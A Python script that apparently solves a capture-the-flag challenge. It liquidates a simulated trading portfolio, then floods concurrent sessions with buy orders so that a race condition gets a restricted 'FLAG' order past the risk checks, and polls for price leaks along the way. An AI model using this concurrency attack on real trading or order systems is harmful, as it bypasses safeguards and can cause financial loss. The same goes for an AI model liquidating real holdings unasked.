#!/usr/bin/env python3
import json, threading, time, sys
from mcpclient import MCP, extract

def main():
    m = MCP()
    pf = json.loads(extract(m.tool("get_portfolio")))
    print("start portfolio:", pf)
    # liquidate: sell all positions in bulk
    for sym, pos in pf.get("positions", {}).items():
        sh = pos["shares"]
        print("sell", sym, sh, "->", extract(m.tool("place_order", {"symbol":sym,"quantity":sh,"order_type":"sell"}))[:120])
    print("after liquidation:", extract(m.tool("get_portfolio")))

    N = int(sys.argv[1]) if len(sys.argv)>1 else 50
    print("pre-creating", N+1, "sessions...")
    socks = [MCP() for _ in range(N+1)]
    barrier = threading.Barrier(N+1)
    outs = [None]*(N+1)
    def worker(i):
        barrier.wait()
        if i == N:
            # FLAG attempt
            outs[i] = extract(socks[i].tool("place_order", {"symbol":"FLAG","quantity":1,"order_type":"buy"}, timeout=60))
        else:
            outs[i] = extract(socks[i].tool("place_order", {"symbol":"AAPL","quantity":1,"order_type":"buy"}, timeout=60))
    ths = [threading.Thread(target=worker, args=(i,)) for i in range(N+1)]
    for t in ths: t.start()
    time.sleep(0.4)
    t0 = time.time()
    barrier.wait()

    # rapid poll of risk + FLAG price during window
    probes = []
    while any(t.is_alive() for t in ths):
        try:
            rr = extract(m.tool("get_risk_report"))
            fp = extract(m.tool("get_stock_price", {"symbol":"FLAG"}))
            probes.append((round(time.time()-t0,2), rr, fp))
        except Exception as e:
            probes.append((round(time.time()-t0,2), "EXC", str(e)))
        time.sleep(0.05)
    for t in ths: t.join()
    maxinflight = 0
    for ts, rr, fp in probes:
        try:
            v = json.loads(rr)["settlements_inflight"]
            maxinflight = max(maxinflight, v)
        except Exception: pass
    print("max inflight observed:", maxinflight)
    for ts, rr, fp in probes:
        if "RESTRICTED" not in fp:
            print("  FLAG PRICE LEAK t=%s %s" % (ts, fp))
    # print anomalies in order responses
    import re
    anom = 0
    for i,o in enumerate(outs):
        if o is None: continue
        tag = "FLAG" if i==N else "AAPL"
        if tag=="AAPL" and not (o.startswith("{") and '"symbol":"AAPL"' in o):
            print("  ANOM", i, o[:200]); anom+=1
        if tag=="FLAG" and "RESTRICTED" not in o:
            print("  FLAG ORDER RESULT", o[:300]); anom+=1
    print("anomalies:", anom)
    print("final risk:", extract(m.tool("get_risk_report")))
    print("final portfolio:", extract(m.tool("get_portfolio")))

if __name__ == "__main__":
    main()
